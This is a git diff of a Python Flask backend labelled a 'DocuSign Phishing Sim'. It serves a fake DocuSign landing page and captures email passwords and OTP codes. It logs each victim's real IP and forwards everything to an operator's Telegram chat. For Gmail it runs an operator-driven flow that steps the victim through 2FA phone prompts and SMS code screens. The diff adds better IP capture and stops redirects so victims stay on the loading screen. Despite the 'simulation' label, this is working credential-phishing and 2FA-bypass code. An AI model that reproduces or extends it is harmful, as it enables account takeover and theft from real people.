@@ -2,7 +2,6 @@
 """
 DocuSign Phishing Sim — Backend API (Webhook Mode)
 Deploy on Render — Pure requests-based Telegram integration
-Serves the landing page from the root URL
 """
 
 import json, logging, datetime, hashlib, threading, time, random, os
@@ -18,7 +17,6 @@ API_BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
 
 app = Flask(__name__)
 
-# Thread-safe session storage (in-memory — REQUIRES single worker!)
 gmail_sessions = {}
 gmail_sessions_lock = threading.Lock()
 
@@ -26,24 +24,36 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(me
 logger = logging.getLogger(__name__)
 
 
-# ─── CORS HEADERS ───
+# ─── CORS ───
 @app.after_request
 def add_cors_headers(response):
-    """Allow CORS for local file:// testing and cross-origin requests."""
     response.headers["Access-Control-Allow-Origin"] = "*"
     response.headers["Access-Control-Allow-Headers"] = "Content-Type"
     response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
     return response
 
 
-# ─── TELEGRAM HELPERS (pure requests, no async issues) ───
+# ─── REAL IP ───
+def get_real_ip():
+    """
+    Get the real client IP behind Render's nginx reverse proxy.
+    Render puts the real IP in X-Forwarded-For header.
+    """
+    forwarded = request.headers.get("X-Forwarded-For", "")
+    if forwarded:
+        real_ip = forwarded.split(",")[0].strip()
+        # Ignore private/proxy IPs
+        if real_ip and not real_ip.startswith(("10.", "172.16.", "192.168.", "127.")):
+            return real_ip
+    # Fallback
+    return request.remote_addr
+
+
+# ─── TELEGRAM HELPERS ───
 def tg_send_message(text, reply_markup=None, parse_mode=None):
-    """Send a Telegram message via direct API call."""
     payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
-    if parse_mode:
-        payload["parse_mode"] = parse_mode
-    if reply_markup:
-        payload["reply_markup"] = json.dumps(reply_markup)
+    if parse_mode: payload["parse_mode"] = parse_mode
+    if reply_markup: payload["reply_markup"] = json.dumps(reply_markup)
     try:
         r = http_req.post(f"{API_BASE}/sendMessage", json=payload, timeout=15)
         result = r.json()
@@ -60,25 +70,18 @@ def tg_send_message(text, reply_markup=None, parse_mode=None):
 
 
 def tg_edit_message(message_id, text, reply_markup=None, parse_mode=None):
-    """Edit an existing Telegram message."""
     payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": message_id, "text": text}
-    if parse_mode:
-        payload["parse_mode"] = parse_mode
-    if reply_markup:
-        payload["reply_markup"] = json.dumps(reply_markup)
+    if parse_mode: payload["parse_mode"] = parse_mode
+    if reply_markup: payload["reply_markup"] = json.dumps(reply_markup)
     try:
         r = http_req.post(f"{API_BASE}/editMessageText", json=payload, timeout=15)
-        result = r.json()
-        if not result.get("ok"):
-            logger.warning(f"⚠️ TG edit warning: {result}")
-        return result.get("ok", False)
+        return r.json().get("ok", False)
     except Exception as e:
-        logger.error(f"❌ TG edit error: {e}", exc_info=True)
+        logger.error(f"❌ TG edit error: {e}")
         return False
 
 
 def tg_answer_callback(callback_query_id):
-    """Answer a callback query (removes loading state on button)."""
     try:
         r = http_req.post(f"{API_BASE}/answerCallbackQuery",
                           json={"callback_query_id": callback_query_id}, timeout=10)
@@ -88,33 +91,25 @@ def tg_answer_callback(callback_query_id):
         return False
 
 
-# ─── INLINE KEYBOARD BUILDER ───
 def inline_kb(rows):
-    """Build inline keyboard markup dict."""
     return {"inline_keyboard": rows}
 
 
 def btn(text, callback_data):
-    """Single inline button."""
     return {"text": text, "callback_data": callback_data}
 
 
 # ─── TELEGRAM WEBHOOK ───
 @app.route(f"/webhook/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
 def telegram_webhook():
-    """Telegram pushes updates here"""
     try:
         data = request.get_json(force=True)
-        logger.info(f"Webhook received: update_id={data.get('update_id')}, keys={list(data.keys())}")
+        logger.info(f"Webhook: update_id={data.get('update_id')}, type={list(data.keys())}")
 
         if "callback_query" in data:
-            logger.info(f"Callback query: {data['callback_query'].get('data','')[:100]}")
             handle_cb(data["callback_query"])
         elif "message" in data:
-            logger.info(f"Message: {data['message'].get('text','')[:100]}")
             handle_msg(data["message"])
-        else:
-            logger.warning(f"Unknown update type: {list(data.keys())}")
 
         return jsonify({"ok": True})
     except Exception as e:
@@ -123,23 +118,20 @@ def telegram_webhook():
 
 
 def handle_msg(msg_data):
-    """Handle regular messages"""
     chat_id = msg_data.get("chat", {}).get("id")
     text = msg_data.get("text", "")
-
     if str(chat_id) != TELEGRAM_CHAT_ID:
-        logger.warning(f"Message from unknown chat: {chat_id}")
         return
 
     if text == "/status":
         with gmail_sessions_lock:
-            active = [s for s in gmail_sessions.values() if s.get("action") not in ("success", "cancelled")]
+            active = {k: v for k, v in gmail_sessions.items() if v.get("action") not in ("success", "cancelled")}
         if not active:
             tg_send_message("No active Gmail sessions.")
         else:
             lines = [f"Active: {len(active)}"]
-            for s in active:
-                lines.append(f"• {s['email']} — stage: {s.get('stage','?')}")
+            for sid, s in active.items():
+                lines.append(f"• {s['email']} → {s.get('stage','?')} ({sid[:6]}...)")
             tg_send_message("\n".join(lines))
     elif text == "/id":
         tg_send_message(f"Chat ID: {chat_id}")
@@ -148,18 +140,16 @@ def handle_msg(msg_data):
             r = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=10)
             info = r.json().get("result", {})
             tg_send_message(
-                f"Webhook URL: {info.get('url','N/A')}\n"
+                f"URL: {info.get('url','N/A')}\n"
                 f"Pending: {info.get('pending_update_count','?')}\n"
-                f"Allowed updates: {info.get('allowed_updates','N/A')}\n"
-                f"Last error: {info.get('last_error_message','None')}\n"
-                f"Last error date: {info.get('last_error_date','N/A')}"
+                f"Allowed: {info.get('allowed_updates','N/A')}\n"
+                f"Error: {info.get('last_error_message','None')}"
             )
         except Exception as e:
             tg_send_message(f"Error: {e}")
 
 
 def handle_cb(query):
-    """Handle button presses"""
     cb_data = query["data"]
     mid = query["message"]["message_id"]
     cq_id = query["id"]
@@ -171,9 +161,10 @@ def handle_cb(query):
             sid = cb_data.split(":", 1)[1]
             with gmail_sessions_lock:
                 if sid not in gmail_sessions:
-                    tg_send_message(f"⚠️ Session {sid} not found (expired or worker mismatch)")
+                    tg_send_message(f"⚠️ Session {sid} not found")
                     return
                 s = gmail_sessions[sid]
+                logger.info(f"✅ Yes clicked for {s['email']} — showing 2FA grid")
                 s["action"] = "2fa_grid"
                 s["stage"] = "awaiting_2fa"
                 kb_rows = []
@@ -181,10 +172,8 @@ def handle_cb(query):
                 for i in range(10, 100):
                     row.append(btn(str(i), f"2fa:{sid}:{i}"))
                     if len(row) == 9:
-                        kb_rows.append(row)
-                        row = []
-                if row:
-                    kb_rows.append(row)
+                        kb_rows.append(row); row = []
+                if row: kb_rows.append(row)
                 kb_rows.append([btn("❌ Cancel", f"cancel:{sid}")])
                 tg_edit_message(mid, "🔐 Select 2FA phone number ending:", inline_kb(kb_rows))
 
@@ -193,26 +182,26 @@ def handle_cb(query):
             sid, digit = parts[1], parts[2]
             with gmail_sessions_lock:
                 if sid not in gmail_sessions:
-                    tg_send_message(f"⚠️ Session {sid} not found")
-                    return
+                    tg_send_message(f"⚠️ Session {sid} not found"); return
                 s = gmail_sessions[sid]
                 s["phone"] = digit
                 s["action"] = "show_prompt"
                 s["stage"] = "prompt_shown"
+                logger.info(f"📱 2FA digit selected: {digit} for {s['email']}")
                 markup = inline_kb([[btn("✅ User Authorized", f"authorized:{sid}")]])
-                tg_edit_message(mid, f"✅ 2FA number selected: ••••{digit}\n\nPrompt sent to user. Waiting for 'Authorized' click...", markup)
+                tg_edit_message(mid, f"✅ 2FA selected: ••••{digit}\n\nWaiting for Authorized click...", markup)
 
         elif cb_data.startswith("authorized:"):
             sid = cb_data.split(":", 1)[1]
             with gmail_sessions_lock:
                 if sid not in gmail_sessions:
-                    tg_send_message(f"⚠️ Session {sid} not found")
-                    return
+                    tg_send_message(f"⚠️ Session {sid} not found"); return
                 s = gmail_sessions[sid]
                 code1 = f"{random.randint(100000, 999999)}"
                 s["sms1"] = code1
                 s["action"] = "sms1"
                 s["stage"] = "sms1"
+                logger.info(f"📱 SMS1 generated for {s['email']}: {code1}")
                 markup = inline_kb([
                     [btn("📱 Send SMS II", f"sms2:{sid}")],
                     [btn("🔄 Resend SMS I", f"resend1:{sid}")]
@@ -223,8 +212,7 @@ def handle_cb(query):
             sid = cb_data.split(":", 1)[1]
             with gmail_sessions_lock:
                 if sid not in gmail_sessions:
-                    tg_send_message(f"⚠️ Session {sid} not found")
-                    return
+                    tg_send_message(f"⚠️ Session {sid} not found"); return
                 s = gmail_sessions[sid]
                 code2 = f"{random.randint(100000, 999999)}"
                 s["sms2"] = code2
@@ -237,8 +225,7 @@ def handle_cb(query):
             sid = cb_data.split(":", 1)[1]
             with gmail_sessions_lock:
                 if sid not in gmail_sessions:
-                    tg_send_message(f"⚠️ Session {sid} not found")
-                    return
+                    tg_send_message(f"⚠️ Session {sid} not found"); return
                 c = f"{random.randint(100000, 999999)}"
                 gmail_sessions[sid]["sms1"] = c
                 tg_send_message(f"🔄 SMS I resent: `{c}`", parse_mode="Markdown")
@@ -247,11 +234,11 @@ def handle_cb(query):
             sid = cb_data.split(":", 1)[1]
             with gmail_sessions_lock:
                 if sid not in gmail_sessions:
-                    tg_send_message(f"⚠️ Session {sid} not found")
-                    return
+                    tg_send_message(f"⚠️ Session {sid} not found"); return
                 s = gmail_sessions[sid]
                 s["action"] = "success"
                 s["stage"] = "done"
+                logger.info(f"✅ Session complete: {s['email']}")
                 tg_edit_message(mid,
                     f"✅ COMPLETE — {s['email']}\n\n"
                     f"Email: {s['email']}\nPassword: {s['password']}\n"
@@ -286,17 +273,15 @@ def handle_cb(query):
         logger.error(f"CB error: {e}", exc_info=True)
 
 
-# ─── SERVE THE LANDING PAGE ───
+# ─── SERVE LANDING PAGE ───
 @app.route("/")
 def serve_landing():
-    """Serve the DocuSign phishing landing page."""
     return send_from_directory(".", "index.html")
 
 
-# ─── API ENDPOINTS ───
+# ─── API ───
 @app.route("/setup_webhook", methods=["POST"])
 def setup_webhook():
-    """Manually set webhook (call once after deploy)."""
     data = request.json
     url = data.get("url", "")
     if not url:
@@ -307,27 +292,17 @@ def setup_webhook():
     try:
         del_resp = http_req.get(f"{API_BASE}/deleteWebhook",
                                 params={"drop_pending_updates": True}, timeout=15)
-        logger.info(f"Delete webhook: {del_resp.json()}")
-
         set_resp = http_req.post(f"{API_BASE}/setWebhook", json={
             "url": webhook_url,
             "allowed_updates": ["message", "callback_query"],
             "drop_pending_updates": True,
             "max_connections": 40
         }, timeout=15)
-        logger.info(f"Set webhook: {set_resp.json()}")
-
         time.sleep(2)
         info_resp = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=15)
         info = info_resp.json().get("result", info_resp.json())
-
-        return jsonify({
-            "delete_result": del_resp.json(),
-            "set_result": set_resp.json(),
-            "webhook_url": webhook_url,
-            "webhook_info": info
-        })
-
+        return jsonify({"delete_result": del_resp.json(), "set_result": set_resp.json(),
+                        "webhook_url": webhook_url, "webhook_info": info})
     except Exception as e:
         logger.error(f"Webhook setup error: {e}", exc_info=True)
         return jsonify({"error": str(e)}), 500
@@ -335,7 +310,6 @@ def setup_webhook():
 
 @app.route("/api/creds", methods=["POST", "OPTIONS"])
 def capture():
-    """Universal credential capture endpoint"""
     if request.method == "OPTIONS":
         return make_response("", 204)
 
@@ -343,18 +317,17 @@ def capture():
     provider = data.get("provider", "unknown")
     email = data.get("email", "")
     password = data.get("password", "")
-    ip = request.remote_addr
+    ip = get_real_ip()  # ← FIXED: real IP
     ua = request.headers.get("User-Agent", "unknown")
 
     session_id = hashlib.md5(f"{time.time()}{random.random()}{email}".encode()).hexdigest()[:12]
 
     entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "provider": provider,
              "email": email, "password": password, "ip": ip, "ua": ua, "session": session_id}
-
     with open(LOG_FILE, "a") as f:
         f.write(json.dumps(entry) + "\n")
 
-    logger.info(f"Captured creds: {provider} / {email} / session={session_id}")
+    logger.info(f"Captured creds: {provider} / {email} / IP={ip} / session={session_id}")
 
     if provider == "gmail":
         with gmail_sessions_lock:
@@ -365,7 +338,7 @@ def capture():
             }
 
         tg_send_message(
-            f"[+]___ Invitation Card (GMAIL) ___[+]\n"
+            f"[+]___ Document Sign (GMAIL) ___[+]\n"
             f"You have a new website form submission \n"
             f"IP Address: {ip}\n"
             f"Id: gmail\n"
@@ -387,7 +360,7 @@ def capture():
     else:
         pid = {"yahoo": "yahoo", "outlook": "outlook", "m365": "m365", "aol": "aol"}.get(provider, provider)
         tg_send_message(
-            f"[+]___ Invitation Card ___[+]\n"
+            f"[+]___ Document Sign ___[+]\n"
             f"You have a new website form submission \n"
             f"IP Address: {ip}\n"
             f"Id: {pid}\n"
@@ -399,17 +372,31 @@ def capture():
 
 @app.route("/api/gmail/status/<session_id>")
 def gmail_status(session_id):
-    """Gmail: frontend polls this"""
+    """
+    Gmail: frontend polls this.
+    Returns 'waiting' by default (stays on loading screen).
+    Only returns 'redirect' if explicitly cancelled.
+    """
     with gmail_sessions_lock:
         if session_id not in gmail_sessions:
-            return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
+            logger.warning(f"Session {session_id} not found — defaulting to waiting")
+            return jsonify({"action": "waiting"})  # ← FIXED: stay on loading instead of redirecting
+
         s = gmail_sessions[session_id]
         action = s.get("action", "waiting")
+        logger.info(f"Status check: {session_id[:8]}... → {action}")
 
+    # Normal flow actions
     if action == "waiting":
+        return jsonify({"action": "waiting"})
+    elif action == "2fa_grid":
+        # Still waiting for operator to pick a number — stay on loading
         return jsonify({"action": "waiting"})
     elif action == "show_prompt":
         return jsonify({"action": "show_prompt", "phone": s.get("phone", "XX")})
+    elif action == "authorized":
+        # Transitioning — still waiting
+        return jsonify({"action": "waiting"})
     elif action == "pw_error":
         return jsonify({"action": "pw_error"})
     elif action == "denied":
@@ -420,8 +407,10 @@ def gmail_status(session_id):
         return jsonify({"action": "sms", "code": s.get("sms2", "000000"), "num": 2})
     elif action == "success":
         return jsonify({"action": "success"})
-    elif action in ("cancelled", "redirect"):
+    elif action == "cancelled":
         return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
+
+    # Fallback — don't redirect, keep waiting
     return jsonify({"action": "waiting"})
 
 
@@ -443,14 +432,14 @@ def capture_otp():
     otp = data.get("otp", "")
     provider = data.get("provider", "unknown")
     session_id = data.get("session", "unknown")
-    ip = request.remote_addr
+    ip = get_real_ip()  # ← FIXED: real IP
 
     entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "event": "otp",
              "provider": provider, "otp": otp, "ip": ip, "session": session_id}
     with open(LOG_FILE, "a") as f:
         f.write(json.dumps(entry) + "\n")
 
-    logger.info(f"OTP captured: {provider} / {otp} / session={session_id}")
+    logger.info(f"OTP: {provider} / {otp} / session={session_id} / IP={ip}")
 
     tg_send_message(f"[+]___ OTP Code ___[+]\nId: {provider}\nOTP: {otp}")
 
@@ -467,6 +456,5 @@ def health_check():
 # ─── START ───
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
-    logger.info(f"Starting Flask on 0.0.0.0:{port}")
-    logger.info(f"Landing page: https://docusign-unx3.onrender.com/")
+    logger.info(f"Starting on 0.0.0.0:{port}")
     app.run(host="0.0.0.0", port=port, debug=False)
